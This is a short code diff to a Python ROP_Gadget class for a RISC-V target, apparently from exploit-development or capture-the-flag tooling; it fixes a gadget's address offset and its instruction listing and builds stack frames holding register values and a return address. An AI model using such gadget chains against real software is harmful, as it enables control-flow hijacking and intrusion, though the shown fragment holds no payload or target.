@@ -12,9 +12,10 @@ class MovA0_S0(ROP_Gadget):
     ld s5, 0x8(sp)
     ld s6, 0(sp)
     addi sp, sp, 0x40
+    jr ra
     '''
     def __init__(self):
-        super().__init__(0x2b762, 0x40)
+        super().__init__(0x1b62e, 0x40)
 
     def construct_frame(self, ra=0, s0=0, s1=0, s2=0, s3=0, s4=0, s5=0, s6=0):
         data = [s6, s5, s4, s3, s2, s1, s0, ra]
